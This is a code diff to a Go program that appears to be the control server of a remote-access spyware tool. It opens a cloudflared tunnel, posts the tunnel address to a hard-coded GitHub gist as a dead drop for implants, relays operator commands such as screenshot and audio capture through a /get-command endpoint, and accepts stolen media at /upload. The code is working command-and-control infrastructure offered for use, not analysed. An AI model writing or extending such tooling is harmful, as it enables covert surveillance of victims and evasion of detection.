@@ -12,14 +12,71 @@ import (
 	"time"
 	"os/exec"
 	"context"
-//	"regexp"
+	"regexp"
+	"bytes"
+	"github.com/joho/godotenv"
+	"encoding/json"
 )
 
-// Global commands so user input can be handeled
+// Global Variables
 
 var mutex sync.Mutex
 var userInput string = ""
+var buf bytes.Buffer
+var tunnelURL string = ""
+var tunnelURLChan = make(chan string)
 
+
+
+func updateGist(token string, content string) error {
+	type GistFile struct {
+    Content string `json:"content"`
+	}
+
+	type GistRequest struct {
+	    Files map[string]GistFile `json:"files"`
+	}
+
+	data := GistRequest{
+	    Files: map[string]GistFile{
+	        "tunnel.txt": {Content: tunnelURL},
+	    },
+	}
+
+	jsonBytes, err := json.Marshal(data)
+	if err != nil {
+	    panic(fmt.Sprintf("Failed to marshal JSON: %v", err))
+	}
+
+	req, err := http.NewRequest(http.MethodPatch, "https://api.github.com/gists/c4748adcea3ad83d87cd8eba959f2fd3", bytes.NewBuffer(jsonBytes))
+
+	if err != nil {
+		panic(err)
+	}
+
+	req.Header.Set("Content-Type", "application/json")
+	req.Header.Set("Authorization", "Bearer "+token)
+
+	client := &http.Client{}
+	resp, err := client.Do(req)
+	if err != nil {
+		panic(err)
+	}
+
+	defer resp.Body.Close()
+
+	if err != nil {
+		panic(err)
+	}
+
+	body, err := io.ReadAll(resp.Body)
+
+	if err != nil {
+		fmt.Println("Failed to read response body:", body)
+		panic(err)
+	}
+	return nil
+}
 
 func ensureCloudflared() string {
 	// Name the binary appropriately for Windows vs Linux
@@ -100,20 +157,6 @@ func uploadHandler(w http.ResponseWriter, r *http.Request) {
 
 func commandHandler(w http.ResponseWriter, r *http.Request) {
 	mutex.Lock()
-	/*if userInput == "" || userInput == "idle" {
-		fmt.Fprint(w, "idle")
-	}
-	if userInput == "ss" {
-		fmt.Fprint(w, "screenshot")
-		userInput = ""
-		fmt.Println("sending screenshot command")
-	}
-	if userInput == "sound" {
-		fmt.Fprint(w, "audio")
-		userInput = ""
-		fmt.Println("sending audio command")
-	}
-	*/
 	command := strings.Fields(userInput)
 	if len(command) == 0 {
 		fmt.Fprint(w, "idle")
@@ -128,6 +171,7 @@ func commandHandler(w http.ResponseWriter, r *http.Request) {
 	case "ss":
 		if len(command) < 2 {
 			fmt.Println("Invalid usage", userInput)
+			break
 		}
 
 		fmt.Fprint(w, userInput)
@@ -153,12 +197,25 @@ func commandHandler(w http.ResponseWriter, r *http.Request) {
 	defer mutex.Unlock()
 }
 
-func useRegex(s string) bool {
-	re := regexp.MustCompile("https://[a-z0-9-]+[.]trycloudflare[.]com")
-	return re.MatchString(s)
+func useRegex(s string) string {
+	re := regexp.MustCompile("(?i)https://[a-z0-9-]+\\.trycloudflare\\.com")
+	
+	return re.FindString(s)
 }
 
-func reveiveInput() {
+func findTunnelURL() string {
+	for {
+		url := useRegex(buf.String())
+		if url != "" {
+			tunnelURLChan <- url
+			break
+		}
+		time.Sleep(1 * time.Second)
+	}
+	return ""
+}
+
+func receiveInput() {
 	scanner := bufio.NewScanner(os.Stdin)
 
 	for scanner.Scan() {
@@ -175,31 +232,54 @@ func reveiveInput() {
 }
 
 func main() {
-	// 1. Ensure the binary is present locally without needing a package manager
+	// Load the env
+	err := godotenv.Load()
+	if err != nil {
+	    fmt.Println("No .env file found")
+	}
+	token := os.Getenv("TOKEN")
+
+
+	// Ensure the binary is present locally without needing a package manager
 	binPath := ensureCloudflared()
 
 	ctx, cancel := context.WithCancel(context.Background())
 	defer cancel()
 
-	// 2. Start cloudflared targeting your local server port
+	// Start cloudflared targeting your local server port
 	cmd := exec.CommandContext(ctx, "./"+binPath, "tunnel", "--protocol", "http2", "--url", "http://localhost:10000")
-	cmd.Stdout = os.Stdout
-	cmd.Stderr = os.Stderr
-	
+	cmd.Stdout = io.Discard
+	cmd.Stderr = &buf
 	
 	if err := cmd.Start(); err != nil {
 		fmt.Printf("Failed to start cloudflared: %v\n", err)
 		return
 	}
+
+	go findTunnelURL()
+	mutex.Lock()
+	tunnelURL = <-tunnelURLChan
+	mutex.Unlock()
+
 	
 
 	time.Sleep(2 * time.Second)
 	fmt.Println("Tunnel is active. Press Ctrl+C to exit.")
+	fmt.Println("The tunnel url is: " + tunnelURL)
+
+	fmt.Println("Updating Gist with the tunnel URL...")
+
+	// Update the Gist with the tunnel URL
+	err = updateGist(token, tunnelURL)
+	if err != nil {
+		fmt.Printf("Failed to update Gist: %v\n", err)
+		return
+	}
 
 	http.HandleFunc("/upload", uploadHandler)
 	http.HandleFunc("/get-command", commandHandler)
 
-	go reveiveInput()
+	go receiveInput()
 	fmt.Println("Receiver running on port 10000. Waiting for media...")
 	panic(http.ListenAndServe(":10000", nil))
 
